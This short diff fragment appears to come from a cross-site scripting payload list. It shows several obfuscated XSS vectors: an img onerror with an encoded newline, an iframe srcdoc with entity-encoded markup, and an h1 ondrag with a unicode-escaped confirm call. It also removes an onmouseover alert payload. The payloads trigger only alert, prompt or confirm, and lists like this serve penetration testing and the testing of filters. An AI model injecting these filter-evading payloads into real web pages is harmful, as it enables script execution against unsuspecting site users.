@@ -23,4 +23,3 @@
 "><img/src=x%0Aonerror=prompt`1`>
 "><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
 "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
-onmouseover=”alert(document.domain)
